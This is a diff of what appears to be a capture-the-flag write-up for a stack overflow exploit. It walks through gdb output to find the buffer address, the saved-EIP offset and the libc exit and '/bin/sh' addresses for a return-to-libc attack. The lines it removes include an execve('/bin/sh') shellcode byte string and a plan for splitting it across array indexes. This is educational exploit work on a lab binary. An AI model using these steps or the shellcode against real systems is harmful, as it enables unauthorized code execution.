@@ -20,7 +20,7 @@ We could store a shellcode on the stack using the store_number() function, but i
 
 1. First of all, let's find the address of the buffer. We know it is located at 0x24(%esp) in the main() function. Using gdb, we get the address of ESP (0xffffd520) and then calculate the effective address of the buffer: 0xffffd544.
 
-2. We must then find the address of EIP in order to calculate its offset from the buffer. To do so, we just need to set a breakpoint anywhere in the main() function using gdb, and enter the command `ìnfo frame`:
+2. We must then find the address of EIP in order to calculate its offset from the buffer. To do so, we just need to set a breakpoint anywhere in the main() function using gdb, and enter the command `ìnfo frame`. It is the address contained in EIP in the saved registers section that we want: 0xffffd70c. We just have to subtract this address from the buffer address to find the offset. Since we record unsigned int, we have to divide this value by 4 to find the right index. So we want to write from index 114.
 ```
 (gdb) info frame
 Stack level 0, frame at 0xffffd710:
@@ -29,13 +29,9 @@ Stack level 0, frame at 0xffffd710:
  Locals at unknown address, Previous frame's sp is 0xffffd710
  Saved registers:
   eip at 0xffffd70c
-```
-It is the address contained in EIP in the saved registers section that we want: 0xffffd70c. We just have to subtract this address from the buffer address to find the offset:
-```
 (gdb) p 0xffffd70c - 0xffffd544
 $1 = 456
 ```
-Since we record unsigned int, we have to divide this value by 4 to find the right index. So we want to write from index 114.
 
 3. Petit problème
 
@@ -51,33 +47,6 @@ $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 (gdb) find __libc_start_main,+99999999,"/bin/sh"
 0xf7f897ec
 ```
-
-
-
-
-"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
-
-
-
-index N     : "\x31\xc9\xf7\xe1"
-index N+1   : "\xb0\x0b" + jump
-index N+3   : "\x51\x68\x2f\x2f"
-index N+4   : "\x73\x68" + jump
-index N+6   : "\x68\x2f\x62\x69"
-index N+7   : "\x6e\x89" + jump
-index N+9   : "\xe3\xcd\x80"
-
-
-
-buf:                    0xffffd544
-
-eip in read_number():   0x8048930
-
-0x8048930 - 0xffffd544 = -4160441364 (decimal value)
--4160441364 / 4 = -1040110341
-
-
-buf at index 189: 0xffffd80d
 
 
 
